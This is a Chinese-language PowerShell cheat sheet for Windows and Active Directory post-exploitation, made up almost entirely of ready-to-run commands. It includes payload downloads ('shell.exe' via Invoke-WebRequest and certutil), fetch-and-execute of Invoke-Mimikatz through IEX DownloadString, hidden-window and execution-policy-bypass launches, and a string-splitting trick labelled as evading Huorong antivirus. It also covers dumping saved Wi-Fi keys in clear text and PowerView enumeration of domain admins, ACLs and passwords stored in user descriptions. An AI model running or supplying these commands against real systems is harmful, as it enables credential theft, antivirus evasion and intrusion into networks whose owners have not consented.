Powershell常用命令

一些有用的命令

系统枚举

  • systeminfo
  • Get-WmiObject Win32_ComputerSystem
  • echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
  • # 安全补丁列表
    Get-Hotfix -description "Security update"
  • wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn"
  • # 环境变量
    Get-ChildItem Env: | ft Key,Value
  • (over cmd.exe)
  • set

HTTP下载(类似于 wget)

  • Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe"
  • # cmd兼容
  • certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe

powershell下载文件

  • powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
  • powershell -exec bypass -f \\webdavserver\folder\payload.ps1
  • powershell (new-object System.Net.WebClient).DownloadFile( ‘http://192.168.168.183/1.exe’,’C:\111111111111111.exe’)
  • powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg','d:\\1.jpg')
  • # 拼接变量绕过火绒
  • powershell "$a='IEX(New-Object Net.WebClient).Downlo';$b='11(''http:///payload/powershell/muet.ps1'')'.Replace('11','adString');IEX ($a+$b)"

WLAN枚举

  • netsh wlan show profiles
  • netsh wlan show profile name="WIFI名字" key=clear

Active Directory枚举

域枚举

  • # 域枚举
  • Get-NetDomain
  • # 森林域列表
  • Get-NetForestDomain
  • # 域SID
  • Get-DomainSID
  • #域策略
  • Get-DomainPolicy
  • #域组织单位
  • Get-NetOU
  • # 可信域列表
  • Get-NetDomainTrust

GPO枚举

  • # Gpo应用于机器
  • Get-NetGPO -ComputerName computername.domain.com

密码枚举

  • # Last Password Set date 上次密码设置日期
  • Get-UserProperty –Properties pwdlastset
  • # Description of User object 用户对象描述
  • Find-UserField -SearchField Description –SearchTerm “pass”

电脑枚举

  • # 列出域内的计算机
  • Get-NetComputer
  • # Pingable主机列表
  • Get-NetComputer -Ping
  • # 列出Windows 7 旗舰版
  • Get-NetComputer –OperatingSystem "Windows 7 Ultimate"

管理组和帐户枚举

  • # 列出域管理员成员
  • Get-NetGroupMember -GroupName "Domain Admins"
  • # 列出域管理组
  • Get-NetGroup *admin*
  • # 列出本地管理员[需要管理权限]
  • Get-NetLocalGroup –ComputerName PCNAME-001
  • # 获取用户组[需要管理权限]
  • Get-NetGroup –UserName "username"

ACL枚举

  • # 用户的ACL
  • Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs
  • # GPO修改的权利
  • Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
  • # 密码重置
  • Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"
